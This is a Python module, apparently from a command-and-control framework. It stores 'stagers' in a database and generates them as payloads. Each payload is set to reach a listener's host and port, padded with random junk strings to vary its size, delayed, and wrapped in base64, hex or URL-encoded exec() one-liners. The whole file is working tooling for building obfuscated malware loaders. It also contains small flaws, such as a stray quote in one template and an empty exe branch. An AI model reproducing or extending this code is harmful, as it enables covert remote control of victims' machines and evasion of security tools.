"""Create Stagers to download or copy"""
import random
import base64
import string
import json
from binascii import hexlify
import urllib.parse
from Database import db_session, StagerModel, ListenerModel


def add_stager(name: str, listener_id: int,
               encoding: str = "base64",
               random_size: bool = False,
               timeout: int = 5000,
               stager_format: str = "py",
               delay: int = 1) -> any:
    """
    Add a stager to the database
    :name: The Name of the stager
    :listener_id: The Listener to use
    :encoding: The encoding to use
    :random_size: Randomize the size of the payload
    :timeout: How often the stager should try to connect before exiting
    :stager_format: The format of the payload
    :delay: How long to wait before starting the stager
    """

    # Check if name is already in use
    stager: StagerModel = db_session.query(
        StagerModel).filter_by(name=name).first()
    if stager is not None:
        raise Exception(f"Stager {name} already exists")

    # Save the Stager to the Database
    stager = StagerModel(
        name=name,
        listener_id=listener_id,
        encoding=encoding,
        random_size=random_size,
        timeout=timeout,
        stager_format=stager_format,
        delay=delay
    )
    db_session.add(stager)
    db_session.commit()
    return "Created Stager successfully!"


def get_stager(stager_id: str, one_liner: bool = True) -> any:
    """
    Get Content of a Stager to download or copy

    :param stager_id: The ID of the Stager
    :param one_liner: Return Stager as one-liner
    :return: The Stager as a string

    """

    # Get required Data
    stager: StagerModel = db_session.query(
        StagerModel).filter_by(stager_id=stager_id).first()
    if not stager:
        raise Exception(f"Stager with ID {stager_id} does not exist")

    listener: ListenerModel = db_session.query(
        ListenerModel).filter_by(listener_id=stager.listener_id).first()
    if listener is None:
        raise Exception("Could not find the listener")

    # Get the Payload from the File
    try:
        with open("Payloads/" + stager.stager_format + ".py", "r") as f:
            payload = f.read()
    except:
        raise Exception("Could not find the payload")

    # Randomize the Payload
    if stager.random_size:
        start = "".join(random.choices(string.ascii_letters, k=random.randint(5, 10))) + " = " + \
            "'" + "".join(random.choices(string.ascii_letters +
                          string.digits, k=random.randint(100, 500))) + "'"
        end = "".join(random.choices(string.ascii_letters, k=random.randint(5, 10))) + " = " + \
            "'" + "".join(random.choices(string.ascii_letters +
                          string.digits, k=random.randint(100, 500))) + "'"
    else:
        start = ""
        end = ""

    # Replace the Payload
    finished_payload = start + "\n"
    finished_payload += f"import time\ntime.sleep({stager.delay})\n"
    finished_payload += f"HOST = '{listener.address}'\n \
        PORT = {listener.port}\n \
        TIMEOUT = {stager.timeout}\n \
        SSL={listener.ssl}\n"
    finished_payload += payload + "\n" + end

    # Encode the Payload
    if not one_liner and not stager.stager_format == "exe":
        if stager.encoding == "base64":
            finished_payload = base64.b64encode(
                finished_payload.encode()).decode()
        elif stager.encoding == "hex":
            finished_payload = hexlify(finished_payload.encode()).decode()
        elif stager.encoding == "url":
            finished_payload = urllib.parse.quote(finished_payload)
        elif stager.encoding == "raw":
            pass
        else:
            raise Exception("Encoding not supported")
    else:
        if stager.encoding == "base64":
            finished_payload = """"import base64; \
                exec(base64.b64decode(b'%s'))""" % base64.b64encode(
                finished_payload.encode()).decode()
        elif stager.encoding == "hex":
            finished_payload = """from binascii import unhexlify;exec(unhexlify('%s'))""" % hexlify(
                finished_payload.encode()).decode()
        elif stager.encoding == "url":
            finished_payload = """import urllib.parse; \
            exec(urllib.parse.unquote('%s'))""" % urllib.parse.quote(
                finished_payload)
        elif stager.encoding == "raw":
            pass
        else:
            raise Exception("encoding not supported")

    if stager.stager_format == "py":
        return finished_payload
    elif stager.stager_format == "exe":
        # Create the EXE
        pass
    else:
        raise Exception("Unknown Format")
